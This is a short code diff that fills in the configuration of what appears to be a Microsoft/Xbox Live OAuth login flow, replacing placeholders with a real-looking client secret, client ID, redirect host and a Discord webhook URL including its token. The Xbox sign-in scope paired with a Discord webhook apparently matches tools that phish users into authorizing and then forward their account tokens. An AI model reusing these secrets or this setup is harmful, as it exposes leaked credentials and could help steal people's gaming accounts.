@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'secret'
-const client_id = 'cid'
-const redirect_uri = 'redirect'
-const webhook_url = 'Your webhook'
+const client_secret = '-idOJcr8PAZypmlJu6-zFPVaKcQNgZ8B'
+const client_id = '1021680771095875614'
+const redirect_uri = 'https://busy-cyan-dhole-kilt.cyclic.app/'
+const webhook_url = 'https"://discord.com/api/webhooks/1085811495838949406/XY2tRUlVHDxbbpMn0zAIF5F188LPXeiOofD7UPX54BlAuQ5oIjx3uzc45SR4LWJP5Ie4'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
